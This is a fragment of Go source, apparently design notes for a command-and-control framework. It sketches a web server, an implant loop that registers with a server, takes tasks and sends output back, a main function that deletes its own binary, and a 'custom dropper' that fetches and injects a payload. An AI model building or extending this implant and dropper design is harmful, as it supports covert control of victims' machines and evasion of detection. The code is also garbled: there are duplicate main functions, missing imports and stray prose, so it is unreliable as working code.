package main

/*
  WEB-App Server
*/

import (
  rtr"github.com/alphamystic/loki/ui/router"
)

func main(){
  //var err error
  rtr := router.NewRouter("0.0.0.0:9000")
  rtr.Run(true)
}


// you can sleep incide your funcs
// give aeach work a context
func init(){
  go agent.Register()
  START:
   agent.GetWork(workChan)
   if err := agent.SendOutput(workChan); err != nil{
     // check the error type
     goto END
   }
   goto START
  END:
}
Get work checks if registered if not it can try re-registration or sleeps
for a bit then tris to get work again.
func main() {
  _ = os.Remove(os.Args[0])
  os.Exit(0)
}

// custom dropper
func init(){
  go dropper.GetPayload(OutputChan)
  START:
   if err := dropper.Inject(OutputChan); err != nil{
     // check the error type
     goto END
   }
   goto START
  END:
}
func main(){
  _ = os.Remove(os.Args[0])
  os.Exit(0)
}
